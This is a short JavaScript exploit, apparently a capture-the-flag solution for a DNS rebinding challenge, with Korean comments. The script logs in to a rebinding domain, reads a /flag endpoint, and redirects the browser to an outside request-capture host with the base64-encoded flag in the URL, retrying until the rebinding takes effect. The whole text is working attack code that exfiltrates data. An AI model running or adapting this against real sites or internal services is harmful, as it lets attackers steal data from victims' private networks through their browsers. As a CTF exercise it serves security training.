// 공격 시나리오
const target = "http://ctf.github.io:3000"; // 자신의 리바인딩 도메인

async function pwn() {
    await fetch(target + '/login', {
        method: 'POST',
        body: 'username=test&password=test',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });

    try {
        const response = await fetch(target + '/flag');
        const data = await response.text();
        if (data.includes("DH{")) {
            location.href = "https://qspavlp.request.dreamhack.games/?flag=" + btoa(data);
        }
    } catch (e) {
        // 아직 리바인딩 전이면 재시도
        setTimeout(pwn, 1000);
    }
}
pwn();